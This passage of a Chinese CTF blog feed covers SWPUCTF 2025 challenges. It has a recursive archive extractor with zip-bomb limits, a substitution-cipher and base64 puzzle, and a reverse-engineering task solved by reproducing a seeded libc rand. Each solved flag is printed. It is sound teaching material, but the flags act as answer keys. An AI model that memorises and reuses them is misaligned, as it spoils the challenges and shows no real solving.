class="subst">{p.stdout}</span>"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> ExtractError(<span class="string">f"Unsupported external extractor: <span class="subst">{cmd}</span>"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_one</span>(<span class="params">src: Path, out_root: Path, stats: Stats, limits: Limits</span>) -&gt; Path:</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    解压单个压缩包到一个独立目录，返回该目录路径。</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    ext = norm_ext(src)</span><br><span class="line">    out_dir = out_root / (src.name + <span class="string">".extracted"</span>)</span><br><span class="line">    out_dir.mkdir(parents=<span class="literal">True</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ext == <span class="string">".zip"</span>:</span><br><span class="line">        extract_zip(src, out_dir, stats, limits)</span><br><span class="line">    <span class="keyword">elif</span> ext <span class="keyword">in</span> (<span class="string">".tar"</span>, <span class="string">".tar.gz"</span>, <span class="string">".tar.bz2"</span>, <span class="string">".tar.xz"</span>):</span><br><span class="line">        extract_tar(src, out_dir, stats, limits)</span><br><span class="line">    <span class="keyword">elif</span> ext == <span class="string">".gz"</span>:</span><br><span class="line">        extract_single_stream(src, out_dir, stats, limits, <span class="string">"gz"</span>)</span><br><span class="line">    <span class="keyword">elif</span> ext == <span class="string">".bz2"</span>:</span><br><span class="line">        extract_single_stream(src, out_dir, stats, limits, <span class="string">"bz2"</span>)</span><br><span class="line">    <span class="keyword">elif</span> ext == <span class="string">".xz"</span>:</span><br><span class="line">        extract_single_stream(src, out_dir, stats, limits, <span class="string">"xz"</span>)</span><br><span class="line">    <span class="keyword">elif</span> ext == <span class="string">".7z"</span>:</span><br><span class="line">        <span class="comment"># 优先 py7zr；否则用 7z</span></span><br><span class="line">        <span class="keyword">if</span> extract_7z_with_py7zr(src, out_dir, stats, limits):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cmd = which(<span class="string">"7z"</span>) <span class="keyword">or</span> which(<span class="string">"7za"</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> cmd:</span><br><span class="line">                <span class="keyword">raise</span> ExtractError(<span class="string">"Need py7zr or system '7z/7za' to extract .7z"</span>)</span><br><span class="line">            extract_with_command(Path(cmd).name, src, out_dir)</span><br><span class="line">    <span class="keyword">elif</span> ext == <span class="string">".rar"</span>:</span><br><span class="line">        <span class="comment"># 优先 unar，其次 7z</span></span><br><span class="line">        cmd = which(<span class="string">"unar"</span>) <span class="keyword">or</span> which(<span class="string">"7z"</span>) <span class="keyword">or</span> which(<span class="string">"7za"</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> cmd:</span><br><span class="line">            <span class="keyword">raise</span> ExtractError(<span class="string">"Need system 'unar' or '7z/7za' to extract .rar"</span>)</span><br><span class="line">        extract_with_command(Path(cmd).name, src, out_dir)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> ExtractError(<span class="string">f"Unsupported archive type: <span class="subst">{src}</span>"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> out_dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">iter_files</span>(<span class="params">root: Path</span>) -&gt; Iterable[Path]:</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> root.rglob(<span class="string">"*"</span>):</span><br><span class="line">        <span class="keyword">if</span> p.is_file():</span><br><span class="line">            <span class="keyword">yield</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recursive_extract</span>(<span class="params"></span></span><br><span class="line"><span class="params">    input_path: Path,</span></span><br><span class="line"><span class="params">    output_dir: Path,</span></span><br><span class="line"><span class="params">    limits: Limits,</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="type">Tuple</span>[Stats, <span class="built_in">int</span>]:</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    返回 (stats, archives_extracted_count)</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    stats = Stats()</span><br><span class="line">    extracted_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 队列：要扫描的目录</span></span><br><span class="line">    scan_dirs = [input_path] <span class="keyword">if</span> input_path.is_dir() <span class="keyword">else</span> [input_path.parent]</span><br><span class="line">    <span class="comment"># 已处理压缩包（按绝对路径+mtime+size 做粗略去重）</span></span><br><span class="line">    seen: <span class="type">Set</span>[<span class="type">Tuple</span>[<span class="built_in">str</span>, <span class="built_in">int</span>, <span class="built_in">int</span>]] = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">    depth = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> scan_dirs:</span><br><span class="line">        <span class="keyword">if</span> depth &gt; limits.max_depth:</span><br><span class="line">            <span class="keyword">raise</span> ExtractError(<span class="string">f"Exceeded max_depth: <span class="subst">{limits.max_depth}</span>"</span>)</span><br><span class="line">        cur = scan_dirs.pop(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果 input_path 是单个文件，也要把它作为候选解压</span></span><br><span class="line">        candidates: Iterable[Path]</span><br><span class="line">        <span class="keyword">if</span> input_path.is_file() <span class="keyword">and</span> depth == <span class="number">0</span>:</span><br><span class="line">            candidates = [input_path]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            candidates = iter_files(cur)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> candidates:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> is_archive(f):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            st = f.stat()</span><br><span class="line">            key = (<span class="built_in">str</span>(f.resolve()), <span class="built_in">int</span>(st.st_mtime), <span class="built_in">int</span>(st.st_size))</span><br><span class="line">            <span class="keyword">if</span> key <span class="keyword">in</span> seen:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            seen.add(key)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 解压到 output_dir 下，按原文件名创建独立 extracted 目录</span></span><br><span class="line">            out_sub = output_dir</span><br><span class="line">            out_created = extract_one(f, out_sub, stats, limits)</span><br><span class="line">            extracted_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 新解压出来的目录，继续扫描（实现嵌套）</span></span><br><span class="line">            scan_dirs.append(out_created)</span><br><span class="line"></span><br><span class="line">        depth += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> stats, extracted_count</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    ap = argparse.ArgumentParser(description=<span class="string">"递归解压嵌套型压缩包（zip/tar/gz/bz2/xz，7z/rar 可选）"</span>)</span><br><span class="line">    ap.add_argument(<span class="string">"input"</span>, <span class="built_in">help</span>=<span class="string">"输入压缩包文件或目录"</span>)</span><br><span class="line">    ap.add_argument(<span class="string">"-o"</span>, <span class="string">"--output"</span>, default=<span class="string">"extracted_out"</span>, <span class="built_in">help</span>=<span class="string">"输出目录（默认 extracted_out）"</span>)</span><br><span class="line">    ap.add_argument(<span class="string">"--max-depth"</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">20</span>, <span class="built_in">help</span>=<span class="string">"最大嵌套深度（默认 20）"</span>)</span><br><span class="line">    ap.add_argument(<span class="string">"--max-files"</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">20000</span>, <span class="built_in">help</span>=<span class="string">"最多写出文件数（默认 20000）"</span>)</span><br><span class="line">    ap.add_argument(<span class="string">"--max-bytes"</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">2_000_000_000</span>, <span class="built_in">help</span>=<span class="string">"最多写出总字节数（默认 2GB）"</span>)</span><br><span class="line">    ap.add_argument(<span class="string">"--overwrite"</span>, action=<span class="string">"store_true"</span>, <span class="built_in">help</span>=<span class="string">"覆盖已存在文件"</span>)</span><br><span class="line">    args = ap.parse_args()</span><br><span class="line"></span><br><span class="line">    input_path = Path(args.<span class="built_in">input</span>).expanduser().resolve()</span><br><span class="line">    output_dir = Path(args.output).expanduser().resolve()</span><br><span class="line">    output_dir.mkdir(parents=<span class="literal">True</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    limits = Limits(</span><br><span class="line">        max_depth=args.max_depth,</span><br><span class="line">        max_files=args.max_files,</span><br><span class="line">        max_bytes=args.max_bytes,</span><br><span class="line">        overwrite=args.overwrite,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        stats, n = recursive_extract(input_path, output_dir, limits)</span><br><span class="line">    <span class="keyword">except</span> ExtractError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"[!] Error: <span class="subst">{e}</span>"</span>, file=sys.stderr)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"[+] Done. Archives extracted: <span class="subst">{n}</span>"</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"[+] Files written: <span class="subst">{stats.files_written}</span>"</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"[+] Bytes written: <span class="subst">{stats.bytes_written}</span>"</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"[+] Output dir: <span class="subst">{output_dir}</span>"</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">raise</span> SystemExit(main())</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>附带用法：</p><p>解压一个文件并递归：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">python3 recursive_extract.py sample.zip -o out</span><br></pre></td></tr></tbody></table></figure><p>解压一个目录（目录里可能有很多压缩包/嵌套）：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">python3 recursive_extract.py ./downloads -o out</span><br></pre></td></tr></tbody></table></figure><p>加限制（防压缩炸弹）：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">python3 recursive_extract.py nested.tar.gz -o out --max-depth 10 --max-files 5000 --max</span><br></pre></td></tr></tbody></table></figure><blockquote><p>【扩展】压缩炸弹：体积很小的压缩文件，解压后会变成极其巨大的数据，用来拖垮你的 CPU、内存或磁盘。<br>它本质是 一种拒绝服务（DoS）攻击手段，在 CTF、恶意样本、邮件附件、自动解压系统里都非常常见。</p></blockquote><hr><h2 id="⭐️-06-SWPUCTF-2025-秋季新生赛-未完的故事"><a href="#⭐️-06-SWPUCTF-2025-秋季新生赛-未完的故事" class="headerlink" title="⭐️ 06 [SWPUCTF 2025 秋季新生赛]未完的故事"></a>⭐️ 06 [SWPUCTF 2025 秋季新生赛]未完的故事</h2><p>🚩flag：<code>NSSCTF{H0nest_fr1eNd1y_4nd_C0nfidenT}</code></p><p>💡hint：<code>misc</code> <code>词频统计</code> <code>古典密码</code></p><p>🔧tool：<code>quipquip</code> <code>cyberchef</code></p><p>看题得知明显单表替换密码<br>单表替换密码工具：<a href="https://quipqiup.com/">https://quipqiup.com/</a></p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">Etn Ghar lvri ur etn beefisela us sha islaas gelral. Shala'i u islurma lvta or hoi isela: ha rajal poroihai klosorm ury beef. Us ubevs ske-sholni ep sha kuy shlevmh augh beef, shala kott ba u natogusa beefzulf. Er sha bugf, os oi hurnklossar: "Sha lais, dtauia klosa os yevliatp." Us polis, daedta kala jaly vruggvisezan se os. Ieza guza bugf urmloty kosh "Era Hvrnlan Yauli ep Ietosvna" or hurn urn uifan, "O kui qvis launorm ubevs Lazanoei' uigarioer se haujar, khy non os arn?" Etn Ghar qvis izotan urn iuon, "Ne yev shorf iha svlran orse u bvssalpty el baguza luor?" Tusal, daedta mlunvutty patt or teja kosh shoi forn ep launorm. Sha gedy ep "Sha Iaumvtt Laisuvlurs" kui taps edar us sha duma khala sha ekral kui nagonorm khashal se slujat pul ukuy, urn sha dumai kala pottan kosh launali' klossar pettek-vdi - ieza ivmmaisan iha me se Ogaturn, khota eshali vlman hal se isuy. Sha shogfais era oi "Sha Soza Slujatal'i Kopa", khogh hui baar laklossar kosh iajar noppalars arnormi. Ieza zas or sha bturf dumai, khota eshali iuon meenbya or sha zulmori. Era nuy, u molt ihekan vd kosh u zurviglods klossar by Tue Ghar hoziatp. Sha isely iseddan us sha zeis awgosorm svlrorm deors, urn sha lais ep sha dumai kala bturf. "Shoi oi yevl ptum" sha molt iuon. "RIIGSP{INBvCWR0W2CyZKJECNP5WcLvCP9NZM5zuKLtbtX=}" Etn Ghar teefan evs ep sha kornek us sha puttorm duvtekrou taujai urn iuon iepsty, "O'ja baar kuosorm pel iezaera se klosa sha arnorm pel za." Sha molt kui iotars pel u zezars, shar seef evs u dar plez hal bum urn klesa er sha tuis duma: "Tusal, sha beefisela ekral kuosan pel hoi launal. Semashal, shay poroihan utt sha vrporoihan iseloai." Sha iassorm ivr ihera shlevmh sha ihed kornek, islasghorm sha ihuneki ep sha ske daedta jaly term, qvis tofa u dalpagsty dtugan pvtt ised.</span><br></pre></td></tr></tbody></table></figure><p>破解后：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Old Chen runs an old bookstore at the street corner. There's a strange rule in his store: he never finishes writing any book. At about two-thirds of the way through each book, there will be a delicate bookmark. On the back, it is handwritten: "The rest, please write it yourself." At first, people were very unaccustomed to it. Some came back angrily with "One Hundred Years of Solitude" in hand and asked, "I was just reading about Remedios' ascension to heaven, why did it end?" Old Chen just smiled and said, "Do you think she turned into a butterfly or became rain?" Later, people gradually fell in love with this kind of reading. The copy of "The Seagull Restaurant" was left open at the page where the owner was deciding whether to travel far away, and the pages were filled with readers' written follow-ups - some suggested she go to Iceland, while others urged her to stay. The thickest one is "The Time Traveler's Wife", which has been rewritten with seven different endings. Some met in the blank pages, while others said goodbye in the margins. One day, a girl showed up with a manuscript written by Lao Chen himself. The story stopped at the most exciting turning point, and the rest of the pages were blank. "This is your flag" the girl said. "NSSCTF{SDBuZXN0X2ZyMWVOZDF5XzRuZF9DMG5maWRlblQ=}" Old Chen looked out of the window at the falling paulownia leaves and said softly, "I've been waiting for someone to write the ending for me." The girl was silent for a moment, then took out a pen from her bag and wrote on the last page: "Later, the bookstore owner waited for his reader. Together, they finished all the unfinished stories." The setting sun shone through the shop window, stretching the shadows of the two people very long, just like a perfectly placed full stop.</span><br></pre></td></tr></tbody></table></figure><p>flag可能是base64编码，放到cyberchef里面看看。<br><a href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a><br>得到：H0nest_fr1eNd1y_4nd_C0nfidenT<br>所以flag：<br>NSSCTF{H0nest_fr1eNd1y_4nd_C0nfidenT}</p><hr><h2 id="⭐️-07-SWPUCTF-2025-秋季新生赛-debuggggg"><a href="#⭐️-07-SWPUCTF-2025-秋季新生赛-debuggggg" class="headerlink" title="⭐️ 07 [SWPUCTF 2025 秋季新生赛]debuggggg"></a>⭐️ 07 [SWPUCTF 2025 秋季新生赛]debuggggg</h2><p>🚩flag：<code>NSSCTF{random_number_0r_not_abc}</code></p><p>💡hint：<code>reverse</code></p><p>🔧tool：<code>idapro</code></p><p>idapro找到关键代码段：</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_1317</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-D8h]</span></span><br><span class="line">  _DWORD v4[<span class="number">32</span>]; <span class="comment">// [rsp+10h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">8</span>]; <span class="comment">// [rsp+90h] [rbp-50h] BYREF</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+98h] [rbp-48h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+A0h] [rbp-40h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+A8h] [rbp-38h]</span></span><br><span class="line">  _QWORD v9[<span class="number">5</span>]; <span class="comment">// [rsp+B0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+D8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  v0 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"input flag:"</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v0, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  *(_QWORD *)s = <span class="number">0LL</span>;</span><br><span class="line">  v6 = <span class="number">0LL</span>;</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">std</span>::operator&gt;&gt;&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, s);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">strlen</span>(s) == <span class="number">32</span> )</span><br><span class="line">  {</span><br><span class="line">    qmemcpy(v9, <span class="string">"XLVGSD{mfbuha_sstgpr_9d_acc_wbi}"</span>, <span class="number">32</span>);</span><br><span class="line">    <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="keyword">sizeof</span>(v4));</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">    {</span><br><span class="line">      v4[i] = rand() % <span class="number">255</span>;</span><br><span class="line">      <span class="keyword">if</span> ( s[i] &lt;= <span class="number">96</span> || s[i] &gt; <span class="number">122</span> )</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span> ( s[i] &lt;= <span class="number">64</span> || s[i] &gt; <span class="number">90</span> )</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">if</span> ( s[i] &gt; <span class="number">47</span> &amp;&amp; s[i] &lt;= <span class="number">57</span> )</span><br><span class="line">            s[i] = (s[i] - <span class="number">48</span> + v4[i] % <span class="number">10</span>) % <span class="number">10</span> + <span class="number">48</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">          s[i] = (s[i] - <span class="number">65</span> - v4[i] % <span class="number">26</span> + <span class="number">26</span>) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        s[i] = (s[i] - <span class="number">97</span> + v4[i] % <span class="number">26</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    sub_126B(s, v9);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    v1 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"wrong length"</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::operator&lt;&lt;(v1, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> v10 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>关键代码段2:</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_126B</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span> &amp;&amp; *(_BYTE *)(i + a1) == *(_BYTE *)(i + a2); ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;();</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">std</span>::ostream::operator&lt;&lt;();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>拉能跑的docker容器（一次性容器）：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">docker run --<span class="built_in">rm</span> -it \</span><br><span class="line">  -v <span class="string">"<span class="variable">$PWD</span>:/work"</span> \</span><br><span class="line">  -w /work \</span><br><span class="line">  python:3.13 \</span><br><span class="line">  bash</span><br></pre></td></tr></tbody></table></figure><p>最终解题脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> CDLL, c_uint</span><br><span class="line"></span><br><span class="line">TARGET = <span class="string">b"XLVGSD{mfbuha_sstgpr_9d_acc_wbi}"</span>  <span class="comment"># 32 bytes</span></span><br><span class="line">SEED = <span class="number">0xABC</span>  <span class="comment"># 2748</span></span><br><span class="line"></span><br><span class="line">libc = CDLL(<span class="string">"libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_v4</span>(<span class="params">seed: <span class="built_in">int</span></span>) -&gt; <span class="built_in">list</span>[<span class="built_in">int</span>]:</span><br><span class="line">    libc.srand(c_uint(seed))</span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">int</span>(libc.rand() % <span class="number">255</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">forward_transform</span>(<span class="params">inp: <span class="built_in">bytes</span>, v4: <span class="built_in">list</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    out = <span class="built_in">bytearray</span>(inp)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        c = out[i]</span><br><span class="line">        v = v4[i]</span><br><span class="line">        <span class="keyword">if</span> <span class="number">97</span> &lt;= c &lt;= <span class="number">122</span>:        <span class="comment"># a-z</span></span><br><span class="line">            out[i] = ((c - <span class="number">97</span> + (v % <span class="number">26</span>)) % <span class="number">26</span>) + <span class="number">97</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="number">65</span> &lt;= c &lt;= <span class="number">90</span>:       <span class="comment"># A-Z</span></span><br><span class="line">            out[i] = ((c - <span class="number">65</span> - (v % <span class="number">26</span>) + <span class="number">26</span>) % <span class="number">26</span>) + <span class="number">65</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="number">48</span> &lt;= c &lt;= <span class="number">57</span>:       <span class="comment"># 0-9</span></span><br><span class="line">            out[i] = ((c - <span class="number">48</span> + (v % <span class="number">10</span>)) % <span class="number">10</span>) + <span class="number">48</span></span><br><span class="line">        <span class="keyword">else</span>:                     <span class="comment"># others unchanged</span></span><br><span class="line">            out[i] = c</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(out)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invert_char</span>(<span class="params">out_c: <span class="built_in">int</span>, v: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="comment"># 这里按“输出字符类型”来回推，通常题目会让类型保持一致（字母还是字母、数字还是数字）</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">97</span> &lt;= out_c &lt;= <span class="number">122</span>:        <span class="comment"># output is lowercase</span></span><br><span class="line">        <span class="keyword">return</span> ((out_c - <span class="number">97</span> - (v % <span class="number">26</span>)) % <span class="number">26</span>) + <span class="number">97</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">65</span> &lt;= out_c &lt;= <span class="number">90</span>:         <span class="comment"># output is uppercase</span></span><br><span class="line">        <span class="keyword">return</span> ((out_c - <span class="number">65</span> + (v % <span class="number">26</span>)) % <span class="number">26</span>) + <span class="number">65</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">48</span> &lt;= out_c &lt;= <span class="number">57</span>:         <span class="comment"># output is digit</span></span><br><span class="line">        <span class="keyword">return</span> ((out_c - <span class="number">48</span> - (v % <span class="number">10</span>)) % <span class="number">10</span>) + <span class="number">48</span></span><br><span class="line">    <span class="keyword">return</span> out_c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_input</span>(<span class="params">target: <span class="built_in">bytes</span>, v4: <span class="built_in">list</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    rec = <span class="built_in">bytearray</span>(<span class="number">32</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        rec[i] = invert_char(target[i], v4[i])</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(rec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    v4 = gen_v4(SEED)</span><br><span class="line">    candidate = recover_input(TARGET, v4)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"seed:"</span>, SEED)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"recovered input:"</span>, candidate.decode(errors=<span class="string">"replace"</span>))</span><br><span class="line"></span><br><span class="line">    check = forward_transform(candidate, v4)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"check == TARGET:"</span>, check == TARGET)</span><br><span class="line">    <span class="keyword">if</span> check != TARGET:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"check bytes:"</span>, check)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure><p><img src="https://a1.boltp.com/2026/02/01/697f3bcbb8886.png" alt="得到flag"></p><hr><p>篇尾：<br>✨<br>欣赏一下花了一些时间做的美丽gif</p><p><img src="https://a1.boltp.com/2026/02/01/697f23155a9e7.gif" alt="某动态壁纸"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF-SWPUCTF2025秋季新生赛1</title>
      <link href="/2026/01/31/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B1/"/>
      <url>/2026/01/31/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B1/</url>
      
